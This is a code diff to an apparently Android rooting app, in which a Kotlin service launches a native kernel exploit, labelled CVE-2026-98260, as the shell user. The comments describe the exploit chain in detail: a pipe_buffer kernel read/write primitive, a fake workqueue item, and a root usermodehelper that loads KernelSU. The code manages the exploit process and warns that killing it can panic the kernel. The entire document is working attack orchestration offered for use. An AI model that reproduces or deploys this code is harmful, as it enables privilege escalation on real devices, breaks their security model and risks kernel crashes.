@@ -3,13 +3,15 @@ package com.roottimer.app
 import android.content.Context
 import android.os.Process
 import java.io.File
+import java.io.FileOutputStream
 import java.io.IOException
 import java.util.concurrent.atomic.AtomicBoolean
+import java.util.concurrent.atomic.AtomicReference
 
 /**
  * Shizuku UserService: runs the CVE-2026-98260 timer exploit as the shell user.
  *
- * Chain (verified on SM-A566S / 6.6.127-android15-8):
+ * Chain for the A56 Android 15-based 6.6 kernel:
  *  1. stage ksud from the APK (jniLibs/libksud.so) to /data/local/tmp/samtimer/ksud
  *  2. raise the tracefs buffer (the leak needs headroom)
  *  3. run libtimer.so in "umhpipe" mode: pipe_buffer kernel r/w primitive ->
@@ -35,6 +37,7 @@ class RootService(private val context: Context) : IRootService.Stub() {
         private const val KSUD_STAGE_PATH = "/data/local/tmp/.ksud-stage"
         private const val TRACE_BUF = "/sys/kernel/tracing/buffer_size_kb"
         private const val INJECT_TIMEOUT_SEC = 420L
+        private const val MANAGER_WAIT_SEC = 20L
     }
 
     override fun isReady(): Boolean {
@@ -78,11 +81,58 @@ class RootService(private val context: Context) : IRootService.Stub() {
         runCatching { callback.onLog(line) }
     }
 
+    private fun exploitAlreadyRunning(): Boolean = runCatching {
+        val check = ProcessBuilder("/system/bin/pidof", "-x", "libtimer.so")
+            .redirectErrorStream(true).start()
+        if (!check.waitFor(2, java.util.concurrent.TimeUnit.SECONDS)) {
+            check.destroyForcibly()
+            return@runCatching false
+        }
+        check.exitValue() == 0 && check.inputStream.bufferedReader().readText().isNotBlank()
+    }.getOrDefault(false)
+
+    private fun managerRegistered(callback: IRootCallback, timerBin: File): Boolean {
+        val deadline = System.nanoTime() + java.util.concurrent.TimeUnit.SECONDS
+            .toNanos(MANAGER_WAIT_SEC)
+        var lastMessage = "Manager registration timed out"
+        do {
+            val result = runCatching {
+                val check = ProcessBuilder(
+                    "/system/bin/su", "-c", "${timerBin.absolutePath} managercheck"
+                ).redirectErrorStream(true).start()
+                if (!check.waitFor(10, java.util.concurrent.TimeUnit.SECONDS)) {
+                    check.destroyForcibly()
+                    return@runCatching null
+                }
+                check.exitValue() to check.inputStream.bufferedReader().readText()
+            }.getOrNull()
+            if (result != null) {
+                lastMessage = result.second.trim().ifEmpty { "Manager check failed" }
+                if (result.first == 0) {
+                    log(callback, lastMessage)
+                    return true
+                }
+            }
+            if (System.nanoTime() >= deadline) break
+            try {
+                Thread.sleep(500)
+            } catch (_: InterruptedException) {
+                break
+            }
+        } while (true)
+        log(callback, lastMessage)
+        return false
+    }
+
     private fun runChain(callback: IRootCallback, ksuLoaded: java.util.concurrent.atomic.AtomicBoolean): Int {
         val uid = Process.myUid()
         if (uid != 2000 && uid != 0) {
             log(callback, "error: not running as shell/root (uid=$uid)")
             return 1
+        }
+        if (exploitAlreadyRunning()) {
+            log(callback, "error: earlier exploit process is still running; reboot before retrying")
+            return 6
         }
         log(callback, "shell context ok (uid=$uid)")
 
@@ -91,6 +141,10 @@ class RootService(private val context: Context) : IRootService.Stub() {
         val ksudSrc = File(nativeDir, "libksud.so")
         if (!timerBin.isFile) {
             log(callback, "error: exploit binary missing: ${timerBin.absolutePath}")
+            return 1
+        }
+        if (!ksudSrc.isFile) {
+            log(callback, "error: matching KernelSU daemon missing")
             return 1
         }
 
@@ -117,7 +171,8 @@ class RootService(private val context: Context) : IRootService.Stub() {
                 log(callback, "warn: .ksud-stage copy failed (${e.message})")
             }
         } catch (e: IOException) {
-            log(callback, "warn: ksud staging failed (${e.message}); KSU load will fail")
+            log(callback, "error: KernelSU staging failed (${e.message})")
+            return 1
         }
 
         // 1c. UMH helper: the same payload binary under the path the fake
@@ -144,34 +199,72 @@ class RootService(private val context: Context) : IRootService.Stub() {
         // 3. run the exploit (umhpipe: pipe r/w primitive -> fake workqueue
         // item -> kernel-issued root usermodehelper -> ksud late-load)
         log(callback, "starting exploit (umhpipe mode)...")
-        val proc = ProcessBuilder(timerBin.absolutePath, "umhpipe")
-            .directory(workDir)
-            .redirectErrorStream(true)
-            .start()
+        val capture = try {
+            FileOutputStream(File(workDir, "last-run.log"), false)
+        } catch (e: IOException) {
+            log(callback, "error: cannot open diagnostic log (${e.message})")
+            return 1
+        }
+        val proc = try {
+            ProcessBuilder(timerBin.absolutePath, "umhpipe")
+                .directory(workDir)
+                .redirectErrorStream(true)
+                .start()
+        } catch (e: IOException) {
+            capture.close()
+            throw e
+        }
+        val parkedReason = AtomicReference<String?>(null)
 
-        val parked = java.util.concurrent.atomic.AtomicBoolean(false)
         val reader = Thread({
             try {
-                proc.inputStream.bufferedReader().useLines { lines ->
-                    for (line in lines) {
-                        log(callback, line)
-                        if (line.contains("KSU_LOADED")) ksuLoaded.set(true)
-                        if (line.contains("PARKED_AFTER_SUCCESS")) parked.set(true)
+                capture.bufferedWriter().use { writer ->
+                    proc.inputStream.bufferedReader().useLines { lines ->
+                        for (line in lines) {
+                            writer.appendLine(line)
+                            writer.flush()
+                            if (line.contains("-- parking without reap") ||
+                                line.contains("KSU_LOADED") || line.contains("KSU_MISSING")) {
+                                runCatching { capture.fd.sync() }
+                            }
+                            log(callback, line)
+                            if (line.contains("KSU_LOADED")) ksuLoaded.set(true)
+                            if (line.contains("-- parking without reap")) parkedReason.set(line)
+                        }
                     }
+                    writer.flush()
+                    runCatching { capture.fd.sync() }
                 }
             } catch (_: Exception) {
+                runCatching { capture.close() }
             }
         }, "rt-tailer")
         reader.isDaemon = true
         reader.start()
 
-        val finished = runCatching {
-            proc.waitFor(INJECT_TIMEOUT_SEC, java.util.concurrent.TimeUnit.SECONDS)
-        }.getOrDefault(false)
+        val deadline = System.nanoTime() + java.util.concurrent.TimeUnit.SECONDS
+            .toNanos(INJECT_TIMEOUT_SEC)
+        var finished = false
+        while (System.nanoTime() < deadline) {
+            if (proc.waitFor(1, java.util.concurrent.TimeUnit.SECONDS)) {
+                finished = true
+                break
+            }
+            val reason = parkedReason.get()
+            if (reason != null) {
+                if (ksuLoaded.get() && managerRegistered(callback, timerBin)) {
+                    log(callback, "success; exploit parked holding zombies until reboot (do not force-stop it)")
+                    return 0
+                }
+                ksuLoaded.set(false)
+                log(callback, "error: exploit parked; reboot before retrying")
+                return 4
+            }
+        }
         if (!finished) {
             // Do NOT SIGKILL: the exploit may hold the reclaimed page; a kill
             // can panic the kernel. Leave it parked and report timeout.
-            if (parked.get() || ksuLoaded.get()) {
+            if (ksuLoaded.get() && managerRegistered(callback, timerBin)) {
                 // Success path: the exploit drained its pools and parked as
                 // the holder for failed-plant zombies (reaping those from a
                 // dead parent corrupts kernel memory). It must stay alive
@@ -179,11 +272,20 @@ class RootService(private val context: Context) : IRootService.Stub() {
                 log(callback, "success; exploit parked holding zombies until reboot (do not force-stop it)")
                 return 0
             }
+            ksuLoaded.set(false)
             log(callback, "error: exploit did not finish in ${INJECT_TIMEOUT_SEC}s (left running)")
             return 4
         }
+        reader.join(2000)
         val rc = proc.exitValue()
         log(callback, "exploit finished rc=$rc")
+        if (ksuLoaded.get()) {
+            if (!managerRegistered(callback, timerBin)) {
+                ksuLoaded.set(false)
+                log(callback, "error: KernelSU module loaded, but Manager is not registered")
+                return 5
+            }
+        }
         return rc
     }
 }
